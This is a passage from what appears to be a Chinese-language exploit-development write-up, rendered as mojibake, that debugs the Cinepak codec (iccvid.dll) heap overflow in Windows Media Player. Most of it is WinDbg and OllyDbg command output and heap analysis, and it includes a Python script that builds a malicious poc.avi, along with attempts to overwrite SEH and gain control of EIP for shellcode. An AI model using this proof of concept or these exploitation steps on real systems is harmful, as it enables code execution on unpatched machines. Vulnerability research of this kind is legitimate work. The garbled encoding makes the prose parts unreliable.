ç°åœ¨éœ€è¦åœ¨73b7cbeeå¤„ä¸‹æ–­ç‚¹,ä½†æ˜¯iccvid.dllåªæœ‰åœ¨wmplayer.exeæ‰“å¼€poc.aviæ—¶æ‰åŠ è½½,è¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•å®ç°ä¸‹æ–­:
    a&gt;åœ¨odæˆ–immunity debuggerä¸­å•ç‹¬åŠ è½½iccvid.dll,å¹¶åœ¨73b7cbeeä¸Šä¸‹æ–­ç‚¹åå†ç”¨odæˆ–immunity debuggeré™„åŠ 
      wmplayer.exeè¿›è¡Œåˆ†æ
    b&gt;åœ¨windbgä¸­é‡æ–°é™„åŠ wmplayer.exe,å¹¶æ‰§è¡Œsxe ld:iccvid.dll,ä¹Ÿå³åœ¨iccvid.dllç¬¬ä¸€æ¬¡è¢«åŠ è½½çš„æ—¶å€™ä¸­æ–­,ä¸­æ–­åå†åœ¨
      windbgä¸­æ‰§è¡Œbp 73b7cbee

    è¿™é‡Œé‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•,è¯¦ç»†æ“ä½œå¦‚ä¸‹

win+r:cmd
gflags -i "C:\Program Files\Windows Media Player\wmplayer.exe" -hpa
    Current Registry Settings for wmplayer.exe executable are: 00000000
åŒå‡»è¿è¡Œwmplayer.exe
windbgé™„åŠ wmplayer.exe
!gflag
    0:003&gt; !gflag
    Current NtGlobalFlag contents: 0x00000000
    å¦‚æœä¸Šé¢æ²¡æœ‰å…ˆæ‰§è¡Œgflags.exe -i ...wmplayer.exe -hpa,è¿™é‡Œåœ¨windbgä¸­æ‰§è¡Œå®Œ!gflagåç»“æœä¸­ä¼šæ˜¾ç¤ºhpaé¡µå †è¿˜å­˜åœ¨
sxe ld:iccvid.dll
sx
    0:003&gt; sx
      ct - Create thread - ignore
      et - Exit thread - ignore
     cpr - Create process - ignore
     epr - Exit process - break
      ld - Load module - break
           (only break for iccvid.dll)
g
åœ¨wmplayer.exeçª—å£ä¸­æ‰“å¼€poc.avi
    0:003&gt; g
    ModLoad: 73b70000 73b87000   C:\WINDOWS\system32\iccvid.dll
    eax=00000001 ebx=00000000 ecx=00000044 edx=000a2ed0 esi=00000000 edi=00000000
    eip=7c92e4f4 esp=0237e28c ebp=0237e380 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!KiFastSystemCallRet:
    7c92e4f4 c3              ret

lmm iccvid v
    0:007&gt; lmm iccvid v
    start    end        module name
    73b70000 73b87000   iccvid     (deferred)             
        Image path: C:\WINDOWS\system32\iccvid.dll
        Image name: iccvid.dll
        Timestamp:        Mon Apr 14 10:12:25 2008 (4802BD89)
        CheckSum:         000219FF
        ImageSize:        00017000
        File version:     1.10.0.12
        Product version:  1.10.0.0
        File flags:       0 (Mask 3F)
        File OS:          40004 NT Win32
        File type:        3.8 Driver
        File date:        00000000.00000000
        Translations:     0409.04e4
        CompanyName:      Radius Inc.
        ProductName:      Cinepak for Windows 32
        InternalName:     iccvid
        OriginalFilename: iccvid.drv
        ProductVersion:   1.10.0.0
        FileVersion:      1.10.0.11
        FileDescription:  CinepakÂ® Codec
        LegalCopyright:   Copyright Â© 1992-1995 Radius Inc., All Rights Reserved
        LegalTrademarks:  CinepakÂ® is a trademark of Radius Inc.
    æŸ¥çœ‹iccvidæ¨¡å—çš„è¯¦ç»†ä¿¡æ¯,è¿™é‡Œä¸èƒ½å†™æˆlmm iccvid.dll v,é‚£æ ·ä¸ä¼šæ‰¾åˆ°iccvidæ¨¡å—

bp 73b7cbee

bl
    0:007&gt; bl
     0 e 73b7cbee     0001 (0001)  0:**** iccvid!Decompress+0x118
g
    0:007&gt; g
    Breakpoint 0 hit
    eax=00000001 ebx=0ac5fd88 ecx=0005e2c0 edx=fffffee0 esi=0011db50 edi=0a9c0050
    eip=73b7cbee esp=0ac5fd38 ebp=0ac5fd60 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!Decompress+0x118:
    73b7cbee e8bb55ffff      call    iccvid!CVDecompress (73b721ae)

bp 73b722cc
    è¿™ä¸ªåœ°å€æ˜¯ä¸Šé¢é€šè¿‡è®¾ç½®hpaæ·»åŠ é¡µå †æ•æ‰åˆ°çš„å¼‚å¸¸å¤„çš„æŒ‡ä»¤
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:1027b000=???????? 

g
    0:010&gt; g
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=00147008 edi=00149008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    *** ERROR: Module load completed but symbols could not be loaded for C:\WINDOWS\system32\wmploc.dll
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:00149008=00000000 
    ds:0023:00147008=00930093

?edi;?esi
    0:010&gt; ?edi;?esi
    Evaluate expression: 1347592 = 00149008
    Evaluate expression: 1339400 = 00147008
    ä¹Ÿå³edi=149008,esi=147008

!heap -p -a 149008
    0:010&gt; !heap -p -a 149008
        address 00149008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    è¯´æ˜ediå±äºa0000å †çš„147000å †å—,è¿™ä¸ªå †å—æ˜¯å ç”¨æ€,è¿™ä¸ªå †å—ä»1470008åˆ°147008+6000=14D008ä¸ºè¿™ä¸ªå †å—çš„æ•°æ®åŒº

!heap -p -a 147008
    0:010&gt; !heap -p -a 147008
        address 00147008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    è¯´æ˜esiå±äºa0000å †çš„147000å †å—,è¿™ä¸ªå †å—æ˜¯å ç”¨æ€,è€Œä¸”æ­£å¥½esi(147008)æ˜¯è¿™ä¸ªå †å—çš„ç´¢å¼•,è¯´æ˜73b722ccå¤„çš„rep
    movsæŒ‡ä»¤æ˜¯è¦å°†147000å †å—ä¸­çš„æ•°æ®å¾€è¿™ä¸ªå †å—è‡ªå·±çš„æ•°æ®åŒºå¼€å§‹åç§»149008-147008=2000å¤„å¼€å§‹å¤åˆ¶,å¯é€šè¿‡ecxæŸ¥çœ‹è¦
    å¤åˆ¶å¤šå°‘å­—èŠ‚æ•°æ®

?ecx
    0:010&gt; ?ecx
    Evaluate expression: 2048 = 00000800
    800&lt;6000-2000,åº”è¯¥ä¸ä¼šè¦†ç›–å †å—,ä½†æ˜¯+hpaæ—¶çš„ç¡®è¯´æ˜¯è¿™ä¸ªrep movsæŒ‡ä»¤å¯¼è‡´çš„å¼‚å¸¸,å…ˆç»§ç»­è¿è¡Œä¸‹å»

t
    0:010&gt; t
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=000007ff edx=0aa5fd38 esi=0014700c edi=0014900c
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014900c=00000000 
    ds:0023:0014700c=00820082
    å‘ç°å†æ¬¡ä¸­æ–­,ä¹Ÿå³rep movsä¸æ˜¯ä¸€æ¬¡å°±ç»“æŸå¤åˆ¶äº†,æ­¤æ—¶edi=14900c,esi=14700c,å‰é¢çš„edi=149008,esi=147008,è¯´æ˜åˆš
    å¤åˆ¶å®Œ4å­—èŠ‚æ•°æ®,ä½†æ˜¯æ­¤æ—¶ecx=7ff,ä¸Šé¢ecx=800,è¯´æ˜ä¸€å…±è¦å¤åˆ¶4*800=2000&lt;6000-2000,è¿™æ ·ç®—,è¿™ä¸ªå¤åˆ¶ç»“æŸåæ˜¯ä¸ä¼š
    è¦†ç›–å½“å‰å †å—çš„ä¸‹ä¸€å †å—çš„,åº”è¯¥ä¸ä¼šå¯¼è‡´å¼‚å¸¸,æš‚æ—¶ä¸å¯ç†è§£,ç»§ç»­å¾€ä¸‹èµ°

t 
    0:010&gt; t
    Breakpoint 1 hit
    eax=00002000 ebx=0a93d330 ecx=000007fe edx=0aa5fd38 esi=00147010 edi=00149010
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:00149010=00000000 
    ds:0023:00147010=00820082
    æƒ…å†µå’Œä¸Šé¢ä¸€æ ·,ç…§è¿™æ ·ä¸‹å»,ç›´åˆ°rep movså®Œæˆåº”è¯¥éƒ½ä¸ä¼šå¼‚å¸¸,ä½†æ˜¯windbgåœ¨è®¾ç½®é¡µå †æ—¶çš„ç¡®è¯´æ˜¯è¿™ä¸€æ¡æŒ‡ä»¤çš„é—®é¢˜,å°
    è¯•å–æ¶ˆ73b722ccå¤„å¯¹åº”çš„rep movsæŒ‡ä»¤,åœ¨è¿™ä¸€å¥ä¸Šé¢ä¸‹æ–­ç‚¹,çŒœæµ‹æœ‰å¯èƒ½æ˜¯ä¸€è½®rep movså®Œæˆåè¿˜æœ‰å…¶ä»–æœºä¼šå†æ‰§è¡Œåˆ°è¿™
    é‡Œ,ç„¶åæ‰å‘ç”Ÿè¦†ç›–å¯¼è‡´å¼‚å¸¸

bc *
ub eip
    0:010&gt; ub eip
    iccvid!CVDecompress+0x102:
    73b722b0 807d1300        cmp     byte ptr [ebp+13h],0
    73b722b4 751b            jne     iccvid!CVDecompress+0x123 (73b722d1)
    73b722b6 803e11          cmp     byte ptr [esi],11h
    73b722b9 7516            jne     iccvid!CVDecompress+0x123 (73b722d1)
    73b722bb 8b4b1c          mov     ecx,dword ptr [ebx+1Ch]
    73b722be 8d3c01          lea     edi,[ecx+eax]
    73b722c1 b900080000      mov     ecx,800h
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]
    è¯´æ˜ä¸Šä¸€å¥æ±‡ç¼–æŒ‡ä»¤å¯¹åº”çš„åœ°å€æ˜¯73b722c6

bp 73b722c6
g
    0:010&gt; g
    Breakpoint 0 hit
    eax=00004000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=01c1eb22 edi=0014b008
    eip=73b722c6 esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x118:
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]   
    æœç„¶ä¸­æ–­åˆ°rep movsçš„ä¸Šä¸€å¥
p
    0:010&gt; p
    eax=00004000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=00149008 edi=0014b008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014b008=00000000 
    ds:0023:00149008=00930093
    æ­¤æ—¶ecx=800,edi=14b008,esi=149008,å†çœ‹ä¸‹æ­¤æ—¶çš„å¤åˆ¶æ•°æ®ä¸å †å—çš„å…³ç³»

!heap -p -a 14b008
    0:010&gt; !heap -p -a 14b008
        address 0014b008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            00147000 0c01 0000  [01]   00147008    06000 - (busy)
              ? wmploc+20093
    ediä¸å‰é¢æ‰€åœ¨çš„å †å—ä¸€æ ·,ä»ç„¶æ˜¯åœ¨a0000å †çš„147008å †å—ä¸­,edi+800*4=14d008=147008+6000=14d008,è¯´æ˜è¿™ä¸€æ¬¡çš„rep
    movsæŒ‡ä»¤ä¼šåˆšå¥½æŠŠå½“å‰å †å—çš„æ•°æ®åŒºå¡«å……åˆ°æœ€å,è¿™æ ·åº”è¯¥ä¹Ÿä¸ä¼šç”±äºè¦†ç›–ä¸‹ä¸€ä¸ªå †å—å¯¼è‡´å¼‚å¸¸,å†æ¬¡æ¨æµ‹,å¯èƒ½è¿˜æœ‰ä¸‹ä¸€æ¬¡
    æœºä¼šä¼šå†æ‰§è¡Œåˆ°73b722ccå¤„çš„rep movsæŒ‡ä»¤

g
    0:010&gt; g
    Breakpoint 0 hit
    eax=00006000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=01c1eb32 edi=0014d008
    eip=73b722c6 esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x118:
    73b722c6 8db700e0ffff    lea     esi,[edi-2000h]
    æœç„¶å†æ¬¡ä¸­æ–­äº†,è¯´æ˜çŒœæµ‹æ˜¯å¯¹çš„

p
    0:010&gt; p
    eax=00006000 ebx=0a93d330 ecx=00000800 edx=0aa5fd38 esi=0014b008 edi=0014d008
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014d008=0c01008e 
    ds:0023:0014b008=00930093
    æ­¤æ—¶edi=14d008,esi=14b008,ecx=800

!heap -p -a 14d008
    0:010&gt; !heap -p -a 14d008
        address 0014d008 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0014d008 008e 0000  [01]   0014d010    00468 - (busy)
    è¿™é‡Œä¹Ÿå¯çœ‹å‡º,14d008æ˜¯ä¸Šé¢147000å †å—çš„ä¸‹ä¸€ä¸ªæ–°çš„å †å—çš„å…¥å£åœ°å€,è¿™ä¸ªæ–°å †å—çš„åœ°å€æ˜¯ä»14d008å¼€å§‹åˆ°
    14d010+468=14d478,è€Œè¿™æ¬¡è¦å¤åˆ¶çš„åœ°å€èŒƒå›´æ˜¯ä»edi=14d008åˆ°edi+800*4=14f008&gt;14d478,è€Œä»14d478å¼€å§‹çš„åœ°å€ç©ºé—´å·²
    ç»å±äºä¸‹ä¸€ä¸ªå †å—,å¦‚ä¸‹

!heap -p -a 14d478
    0:010&gt; !heap -p -a 14d478
        address 0014d478 found in
        _HEAP @ a0000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0014d478 008e 0000  [01]   0014d480    00468 - (busy)       
    è¯´æ˜14d478è¿™ä¸ªå †å—ä¼šè¢«è¦†ç›–,ä¸”14d480+468=14d8e8&lt;14f008,ä¹Ÿå³è¦†ç›–å®Œè¿™ä¸ªå †å—è¿˜è¦ç»§ç»­è¦†ç›–åé¢çš„å †å—,è¿™æ ·ææœ‰å¯èƒ½ä¼šå¯¼
    è‡´å¼‚å¸¸çš„å‘ç”Ÿ,å¯ä»¥é¢„æµ‹,å†æ¬¡æ‰§è¡Œgå°†ä¼šå‘ç”Ÿå¼‚å¸¸
g
    0:010&gt; g
    (1ac.1bc): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=00006000 ebx=0a93d330 ecx=00000402 edx=0aa5fd38 esi=0014c000 edi=0014e000
    eip=73b722cc esp=0aa5fd04 ebp=0aa5fd30 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
    iccvid!CVDecompress+0x11e:
    73b722cc f3a5            rep movs dword ptr es:[edi],dword ptr [esi] es:0023:0014e000=???????? 
    ds:0023:0014c000=00000000
    é¢„æµ‹æ­£ç¡®,æ­¤æ—¶ecx=402,è¯´æ˜æ˜¯å¤åˆ¶äº†(800-402)*4=3fe*4=ff8(10è¿›åˆ¶çš„4088ä¸ª)å­—èŠ‚åç¨‹åºå¼‚å¸¸,å¹¶å†ä¸å¯æ§,å•ç‹¬è¿è¡Œ
    wmplayer.exeå¹¶æ‰“å¼€poc.aviæ—¶ä¼šå¼¹å‡ºå¦‚ä¸‹æŠ¥é”™å¯¹è¯æ¡†
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/heap-4.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>è¯´æ˜æ˜¯å¤åˆ¶äº†4008ä¸ªå­—èŠ‚å,ä¸‹é¢çš„å†…å­˜ä¸å¯å†™äº†,å¼•å‘å¼‚å¸¸,ç°åœ¨è¦æƒ³åŠæ³•æ§åˆ¶eip,æ‰§è¡Œæˆ‘çš„shellcode,è¦æƒ³æ§åˆ¶eip,ç°åœ¨è€ƒè™‘
ä»ä»¥ä¸‹å‡ ä¸ªè§’åº¦ä¸Šå…¥æ‰‹:
    1&gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„retn
    2&gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„seh
    3&gt;æ‰¾åˆ°DWORD SHOOTæœºä¼š

1&gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„retn
    è¿™ç§å¯èƒ½æ€§å‡ ä¹å¯ä»¥å¿½ç•¥,ä¸€èˆ¬å †æº¢å‡ºæ¼æ´çš„åˆ©ç”¨é‡‡ç”¨DWORD SHOOTçš„"ç²¾ç¡®æ‰“å‡»",è¶…é•¿æ•°æ®è¦†ç›–ä½œä¸º"åœ°æ¯¯å¼è½°ç‚¸"è¿™ç§æ‰‹æ®µ
    ä¸€èˆ¬ç”¨äºæ ˆæº¢å‡º,å› ä¸ºretnåœ¨æ ˆä¸­,è€Œè¦æƒ³æŠŠæ•°æ®ä»å †åŒºè¦†ç›–åˆ°æ ˆåŒº,è¦å¤åˆ¶è¶…é•¿è¶…é•¿çš„æ•°æ®,æ­¤ä¾‹ä¸­,å½“eip=73B721EDæ—¶,å¯¹
    åº”å¦‚ä¸‹æŒ‡ä»¤,è¯¥eipåˆ°è¾¾æ–¹å¼ä¸ºåœ¨odä¸­å•ç‹¬æ‰“å¼€iccvid.dll,åœ¨73b7cbeeå¤„ä¸‹æ–­ç‚¹,è¯¥å¤„å¯¹åº”ä¸Šé¢çš„windbgçš„å…³é”®callä¸‹æ–­ç‚¹
    å¤„,ç„¶åodé™„åŠ é‡æ–°æ‰“å¼€çš„wmplayer.exe,å¹¶ç”¨wmplayer.exeæ‰“å¼€poc.avi,è§¦å‘73b7cbeeå¤„çš„æ–­ç‚¹,f7è·Ÿè¿›å…³é”®call,å•æ­¥åˆ°
    73b721edå¤„
        73B721ED  |.  8B75 0C       mov esi,[arg.2]
    æ­¤æ—¶odä¸­çš„æç¤ºå¤„æ˜¾ç¤ºå¦‚ä¸‹ä¿¡æ¯:
        å †æ ˆ ss:[0A80FD3C]=01C2CAF8
        esi=00000000
    åœ¨odæç¤ºçª—å£ä¸­çš„01c2caf8ä¸Šå³é”®åœ¨æ•°æ®çª—å£ä¸­è·Ÿéšæ•°å€¼,ç»“æœå¦‚ä¸‹:
        01C2CAF8  00 00 00 68 01 60 01 20 00 10 10 00 00 10 00 00  ...h` .....
        01C2CB08  00 00 00 60 01 60 20 00 00 00 11 00 00 10 41 41  ...`` .....AA
        01C2CB18  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 41  AAAAAAAAAA..AA
        01C2CB28  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 41  AAAAAAAAAA..AA
        01C2CB38  41 41 41 41 41 41 41 41 41 41 11 00 00 10 41 00  AAAAAAAAAA..A.
        01C2CB48  69 64 78 31 10 00 00 00 30 30 64 63 10 00 00 00  idx1...00dc...
    ä¹Ÿå³æ­¤æ—¶å¯¹åº”çš„æ•°æ®ä¸ºpoc.aviä¸­çš„cinepak_codec_data1å­—æ®µçš„æ•°æ®,å¦‚ä¸‹å›¾,å¯¹åº”exploit-dbé“¾æ¥ä¸º:
        https://www.exploit-db.com/exploits/15112/
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/heap-5.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    æ­¤æ—¶esp=0A80FD04,è€Œå¯æ§è¾“å…¥çš„æ•°æ®æ‰€åœ¨çš„å†…å­˜åœ°å€ä¸º01c2caf8,0a80fd04-01c2caf8=8BE320C=146682380ä¸ªå­—èŠ‚
    =139.887218475341796875 Må¤§å°,å¯è§æ•°æ®é‡ä¸å°,è¿™æ ·è‚¯å®šä¼šè¦†ç›–å¾ˆå¤šæ•°æ®,åœ¨æ‰§è¡Œåˆ°retnå‰å¿…ç„¶ä¼šå¼•å‘å¼‚å¸¸,æ‰€ä»¥æƒ³é€šè¿‡
    è¦†ç›–retnè¾¾åˆ°æ§åˆ¶eipæ˜¯ä¸å¯å–çš„

2&gt;è¶…é•¿æ•°æ®è¦†ç›–æ ˆä¸­çš„seh
    å¯¹åº”1ä¸­å¯è§‚å¯Ÿåˆ°å†…å­˜ä¸­çš„æ•°æ®ä¸ºcinepak_codec_data1å­—æ®µæ—¶,eip=73b721ed,alt+v,æŸ¥çœ‹seh,ç»“æœå¦‚ä¸‹:
        SEH é“¾ç”¨äº  çº¿ç¨‹  000006D4
        åœ°å€       SEå¤„ç†ç¨‹åº
        0A80FFDC   kernel32.7C839AC0
    è¦æƒ³è¦†ç›–åˆ°0a80ffdcå¤„,éœ€è¦è¦†ç›–0a80ffdc+4-01c2caf8=146683112ä¸ªå­—èŠ‚=139.88791656494140625 Må¤§å°,é‡æ–°ä¿®æ”¹ç”Ÿæˆ
    poc.aviçš„pythonä»£ç ,å°è¯•è¦†ç›–åˆ°sehå¤„ç†ç¨‹åºçš„åœ°å€,ä»1c2caf8åˆ°poc.aviçš„æœ€åä¸€ä¸ªæ„é€ çš„æ•°æ®æ‰€åœ¨çš„å­—ç¬¦å…±æœ‰105ä¸ªå­—
    èŠ‚,éœ€è¦åœ¨åé¢åŠ å¤š146683112-105=146683007ä¸ªå­—èŠ‚,å†åŠ 4ä¸ªå­—èŠ‚å¯ä»¥è¦†ç›–sehçš„å¼‚å¸¸å¤„ç†ç¨‹åºæŒ‡é’ˆ,ä¹Ÿå³146683011ä¸ªå­—èŠ‚
    ,æ„é€ ä»£ç å¦‚ä¸‹,åœ¨åŸæ¥çš„ä»£ç ä¸­åŠ å…¥
        my_data='B'*146683011
        avifile.write(my_data)

</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import sys
 
def main():
 
    aviHeaders = '\x52\x49\x46\x46\x58\x01\x00\x00\x41\x56\x49\x20\x4C\x49\x53\x54\xC8\x00\x00\x00\x68\x64\x72\x6C\x61\x76\x69\x68\x38\x00\x00\x00\xA0\x86\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x01\x00\x00\x4E\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4C\x49\x53\x54\x7C\x00\x00\x00\x73\x74\x72\x6C\x73\x74\x72\x68\x38\x00\x00\x00\x76\x69\x64\x73\x63\x76\x69\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE8\x03\x00\x00\x10\x27\x00\x00\x00\x00\x00\x00\x4E\x00\x00\x00\x20\x74\x00\x00\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x20\x01\x73\x74\x72\x66\x28\x00\x00\x00\x28\x00\x00\x00\x50\x01\x00\x00\x20\x01\x00\x00\x01\x00\x18\x00\x63\x76\x69\x64\x84\x8D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    padding = '\x4A\x55\x4E\x4B\x00\x00\x00\x00\x4A\x55\x4E\x4B\x00\x00\x00\x00'
    movi_tag = '\x4C\x49\x53\x54\x5C\x00\x00\x00\x6D\x6F\x76\x69\x30\x30\x64\x63\x10\x00\x00\x00'
    cinepak_codec_data1 = '\x00\x00\x00\x68\x01\x60\x01\x20'
    number_of_coded_strips = '\x00\x10'
    cinepak_codec_data2 = '\x10\x00\x00\x10\x00\x00\x00\x00\x00\x60\x01\x60\x20\x00\x00\x00\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x11\x00\x00\x10\x41\x00'
    idx_tag = '\x69\x64\x78\x31\x10\x00\x00\x00\x30\x30\x64\x63\x10\x00\x00\x00\x04\x00\x00\x00\x68\x00\x00\x00'

    my_data='B'*146683011
     
    avifile = open('poc.avi', 'wb+')
    avifile.write(aviHeaders)
    avifile.write(padding)
    avifile.write(movi_tag)
    avifile.write(cinepak_codec_data1)
    avifile.write(number_of_coded_strips)
    avifile.write(cinepak_codec_data2)
    avifile.write(idx_tag)

    avifile.write(my_data)
     
    avifile.close()
    print '[-] AVI file generated'
     
if __name__ == '__main__':
    main()
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ubuntuä¸‹æ–°ç”Ÿæˆçš„pov.aviæ–‡ä»¶146.7M,æ‹·è´åˆ°winxpä¸­,ç”¨wmplayer.exeåœ¨odé™„åŠ ä¸‹æ‰“å¼€,åŒæ ·å•æ­¥åˆ°73b721edå¤„,åœ¨æç¤ºçª—
    å£ä¸­å³é”®åœ¨æ•°æ®çª—å£ä¸­è·Ÿéšæ•°å€¼,å¦‚ä¸‹å›¾
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/heap-6.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ä»ä¸Šé¢å›¾ä¸­çœ‹å‡º,æ•°æ®çª—å£ä¸­å­—ç¬¦"B"å¹¶æ²¡æœ‰å¤åˆ¶146683011ä¸ªåˆ°å†…å­˜å°±è¢«æˆªæ–­äº†,è¯´æ˜æƒ³åˆ©ç”¨è¶…é•¿æ•°æ®ä»å †åŒºè¦†ç›–åˆ°æ ˆåŒºä¸­
    çš„sehçš„æƒ³æ³•ä¹Ÿä¸èƒ½å®ç°

3&gt;æ‰¾åˆ°ä¸€æ¬¡DWORD SHOOSTæœºä¼š
    å¦‚æœèƒ½æ‰¾åˆ°ä¸€æ¬¡DWORD SHOOTæœºä¼š,é‚£å°±æœ‰è¾ƒå¤šé€‰æ‹©å¯ä»¥æ§åˆ¶eipäº†,ä½†æ˜¯ä¸Šé¢æåˆ°DWORD SHOOTçš„æœºä¼šåœ¨ç¬”è€…çœ‹æ¥åªæœ‰ç©ºé—²å †
    å—çš„å¸ä¸‹,ä¹Ÿå³å¯¹åº”æ–°å †å—çš„åˆ†é…ä¼šæœ‰DWORD SHOOTæœºä¼š,ç°åœ¨è¦æƒ³åŠæ³•æ‰¾åˆ°è¿™æ ·çš„æœºä¼š,ä¸Šé¢è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°å½“æ‰§è¡Œåˆ°å…³é”®
    çš„rep movsæŒ‡ä»¤ç¬¬ä¸‰æ¬¡æ—¶ä¼šå‘ç”Ÿå¼‚å¸¸,å¿…é¡»è¦åœ¨rep movsæŒ‡ä»¤å‘ç”Ÿå¼‚å¸¸å‰æ‰¾åˆ°ä¸€æ¬¡HeapAllocçš„è°ƒç”¨æ‰æœ‰å¯èƒ½å¯ä»¥DWORD
    SHOOT,è€Œä¸”HeapAllocè¦å‡ºç°åœ¨poc.aviä¸­çš„æ•°æ®å¤åˆ¶åˆ°å†…å­˜ä¸­ä¹‹å

    ä¹Ÿå³è¦åœ¨wmplayer.exeæ‰“å¼€poc.aviä¹‹ååˆ°rep movsç¬¬ä¸‰æ¬¡å¤åˆ¶å¼‚å¸¸å‘ç”Ÿä¹‹å‰è¿™æœŸé—´æ‰¾åˆ°HeapAllocçš„è°ƒç”¨
    
    é‡æ–°odé™„åŠ wmplayer.exe,åœ¨1c2caf8ä¸Šä¸‹å†…å­˜å†™å…¥æ–­ç‚¹(1c2caf8å¯¹åº”åŸæ¥çš„poc.aviä¸­çš„ç”Ÿæˆæ•°æ®ä¸­çš„
    cinepak_codec_data1å­—æ®µ),å¹¶ç”¨wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi
        è¿™ç§æƒ³æ³•æ²¡èƒ½å®ç°,å› ä¸ºodé™„åŠ wmplayer.exeå,1c2caf8å†…å­˜åœ°å€è¿˜æ²¡å‡ºç°,æ— æ³•ä¸‹å†…å­˜å†™å…¥æ–­ç‚¹,å°è¯•ç­‰1c2caf8å‡ºç°
        åå†ä¸‹å†…å­˜æ–­ç‚¹å¹¶é‡æ–°odåŠ è½½,ä½†æ˜¯è¿™æ ·æ— æ³•åœ¨1c2caf8è¢«å†™å…¥ä¹‹å‰æ–­ä¸‹

    ä¸Šé¢çš„æ–¹æ³•å¤±è´¥,äºæ˜¯é‡‡ç”¨ä¸‹é¢çš„æ–¹æ³•:
        è¿è¡Œwmplayer.exe
